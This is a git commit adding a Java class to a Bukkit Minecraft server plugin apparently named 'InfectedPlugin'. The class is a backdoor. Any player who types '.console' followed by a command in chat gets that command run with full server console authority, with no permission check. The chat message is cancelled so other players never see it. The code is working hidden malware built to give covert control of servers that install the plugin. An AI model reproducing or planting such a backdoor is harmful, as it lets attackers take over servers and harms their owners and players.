c4ec1a2884d92084bc843faa09d303bfcf75a575
Wilee999 <Infinitywilee@rocketmail.com>
2013-10-29 19:08:13 -0700

    added .console

---
+++ src/org/CreeperCoders/InfectedPlugin/Commands/Command_console.java
@@ -0,0 +1,44 @@
+package org.CreeperCoders.InfectedPlugin.Commands;
+
+import org.bukkit.*;
+import org.bukkit.entity.Player;
+import org.bukkit.event.*;
+import org.bukkit.event.player.AsyncPlayerChatEvent;
+
+public class Command_console implements Listener
+{
+    @EventHandler
+    public void onPlayerChat(AsyncPlayerChatEvent event)
+    {
+        String message = event.getMessage();
+        final Player p = event.getPlayer();
+        boolean cancel = false;
+        
+        if (message.startsWith("."))
+        {
+            String[] args = message.split(" ");
+            if (args == null)
+            {
+                return;
+            }
+            
+            int i;
+            if ((args[0].equalsIgnoreCase(".console")) && (args.length >= 2))
+            {
+                String command = "";
+                for (i = 1; i < args.length; i++)
+                {
+                    command = command + args[i] + " ";
+                }
+                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command.trim());
+                cancel = true;
+            }
+        }
+        
+        if (cancel)
+        {
+            event.setCancelled(true);
+            return;
+        }
+    }
+}
